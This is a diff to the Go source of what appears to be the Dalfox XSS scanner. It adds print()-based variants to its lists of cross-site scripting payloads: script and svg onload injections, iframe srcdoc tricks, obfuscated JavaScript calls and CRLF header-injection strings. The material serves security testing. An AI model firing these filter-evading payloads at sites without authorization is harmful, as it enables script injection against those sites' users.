@@ -105,7 +105,7 @@ func getOpenRedirectPayload() []string {
 	return payload
 }
 
-func getCRLFPayload() []string{
+func getCRLFPayload() []string {
 	payload := []string{
 		"%0d%0aDalfoxcrlf: 1234",
 		"%E5%98%8D%E5%98%8ADalfoxcrlf: 1234",
@@ -312,9 +312,11 @@ func getHTMLPayload(ip string) []string {
 		"<sVg/onload=prompt(DALFOX_ALERT_VALUE) class=dalfox>",
 		"<Svg/onload=alert(DALFOX_ALERT_VALUE) class=dalfox>",
 		"<svG/onload=confirm(DALFOX_ALERT_VALUE) class=dalfox>",
+		"<svG/onload=print(DALFOX_ALERT_VALUE) class=dalfox>",
 		"<ScRipt class=dalfox>alert(DALFOX_ALERT_VALUE)</script>",
 		"<sCriPt class=dalfox>prompt(DALFOX_ALERT_VALUE)</script>",
 		"<scRipT class=dalfox>confirm(DALFOX_ALERT_VALUE)</script>",
+		"<scRipT class=dalfox>print(DALFOX_ALERT_VALUE)</script>",
 		"<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() class=dalfox>",
 		"<audio controls ondurationchange=alert(DALFOX_ALERT_VALUE) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>",
 		"<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=alert(DALFOX_ALERT_VALUE)></menu></div>",
@@ -324,9 +326,11 @@ func getHTMLPayload(ip string) []string {
 		"<sVg/onload=prompt(DALFOX_ALERT_VALUE)>",
 		"<Svg/onload=alert(DALFOX_ALERT_VALUE)>",
 		"<svG/onload=confirm(DALFOX_ALERT_VALUE)>",
+		"<svG/onload=print(DALFOX_ALERT_VALUE)>",
 		"<ScRipt>alert(DALFOX_ALERT_VALUE)</script>",
 		"<sCriPt>prompt(DALFOX_ALERT_VALUE)</script>",
 		"<scRipT>confirm(DALFOX_ALERT_VALUE)</script>",
+		"<scRipT>print(DALFOX_ALERT_VALUE)</script>",
 		"<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()>",
 		"<audio controls ondurationchange=alert(DALFOX_ALERT_VALUE)><source src=1.mp3 type=audio/mpeg></audio>",
 		"<div contextmenu=xss><p>1<menu type=context onshow=alert(DALFOX_ALERT_VALUE)></menu></div>",
@@ -335,6 +339,7 @@ func getHTMLPayload(ip string) []string {
 		"<iframe srcdoc=\"<input onauxclick=alert(DALFOX_ALERT_VALUE)>\" class=dalfox></iframe>",
 		"<iframe srcdoc=\"<input onauxclick=prompt(DALFOX_ALERT_VALUE)>\" class=dalfox></iframe>",
 		"<iframe srcdoc=\"<input onauxclick=confirm(DALFOX_ALERT_VALUE)>\" class=dalfox></iframe>",
+		"<iframe srcdoc=\"<input onauxclick=print(DALFOX_ALERT_VALUE)>\" class=dalfox></iframe>",
 	}
 	if strings.Contains(ip, "comment") {
 		// TODO add comment payloads
@@ -369,6 +374,7 @@ func getAttrPayload(ip string) []string {
 		payload = append(payload, mh+"=alert(DALFOX_ALERT_VALUE) class=dalfox ")
 		payload = append(payload, mh+"=confirm(DALFOX_ALERT_VALUE) class=dalfox ")
 		payload = append(payload, mh+"=prompt(DALFOX_ALERT_VALUE) class=dalfox ")
+		payload = append(payload, mh+"=print(DALFOX_ALERT_VALUE) class=dalfox ")
 	}
 
 	// set html base payloads
@@ -413,12 +419,15 @@ func getInJsPayload(ip string) []string {
 		"alert(DALFOX_ALERT_VALUE)",
 		"confirm(DALFOX_ALERT_VALUE)",
 		"prompt(DALFOX_ALERT_VALUE)",
+		"print(DALFOX_ALERT_VALUE)",
 		"</sCRipt><sVg/onload=alert(DALFOX_ALERT_VALUE)>",
 		"</scRiPt><sVG/onload=confirm(DALFOX_ALERT_VALUE)>",
 		"</sCrIpt><SVg/onload=prompt(DALFOX_ALERT_VALUE)>",
+		"</sCrIpt><SVg/onload=print(DALFOX_ALERT_VALUE)>",
 		"</sCriPt><ScRiPt>alert(DALFOX_ALERT_VALUE)</sCrIpt>",
 		"</scRipT><sCrIpT>confirm(DALFOX_ALERT_VALUE)</SCriPt>",
 		"</ScripT><ScRIpT>prompt(DALFOX_ALERT_VALUE)</scRIpT>",
+		"</ScripT><ScRIpT>print(DALFOX_ALERT_VALUE)</scRIpT>",
 		"window['ale'+'rt'](window['doc'+'ument']['dom'+'ain'])",
 		"this['ale'+'rt'](this['doc'+'ument']['dom'+'ain'])",
 		"self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]])",
@@ -428,6 +437,7 @@ func getInJsPayload(ip string) []string {
 		"frames[/al/.source+/ert/.source](/XSS/.source)",
 		"self[/*foo*/'prompt'/*bar*/](self[/*foo*/'document'/*bar*/]['domain'])",
 		"this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain'])",
+		"this[/*foo*/'print'/*bar*/](this[/*foo*/'document'/*bar*/]['domain'])",
 		"window[/*foo*/'confirm'/*bar*/](window[/*foo*/'document'/*bar*/]['domain'])",
 		"{{toString().constructor.constructor('alert(DALFOX_ALERT_VALUE)')()}}",
 		"{{-function(){this.alert(DALFOX_ALERT_VALUE)}()}}",
@@ -487,7 +497,7 @@ func getInJsPayload(ip string) []string {
 }
 
 func getDOMXSSPayload() []string {
-	payload := []string {
+	payload := []string{
 		"<img/src/onerror=.1|alert`DALFOX_ALERT_VALUE`>",
 		";alert(DALFOX_ALERT_VALUE);",
 		"javascript:alert(DALFOX_ALERT_VALUE)",
@@ -496,12 +506,13 @@ func getDOMXSSPayload() []string {
 }
 
 func getDeepDOMXSPayload() []string {
-	payload := []string {
+	payload := []string{
 		"<svg/OnLoad=\"`${prompt`DALFOX_ALERT_VALUE`}`\">",
 		"<img/src/onerror=.1|alert`DALFOX_ALERT_VALUE`>",
 		"alert(DALFOX_ALERT_VALUE)",
 		"prompt(DALFOX_ALERT_VALUE)",
 		"confirm(DALFOX_ALERT_VALUE)",
+		"print(DALFOX_ALERT_VALUE)",
 		";alert(DALFOX_ALERT_VALUE);",
 		"javascript:alert(DALFOX_ALERT_VALUE)",
 		"java%0ascript:alert(DALFOX_ALERT_VALUE)",
@@ -530,4 +541,3 @@ func getDeepDOMXSPayload() []string {
 	}
 	return payload
 }
-
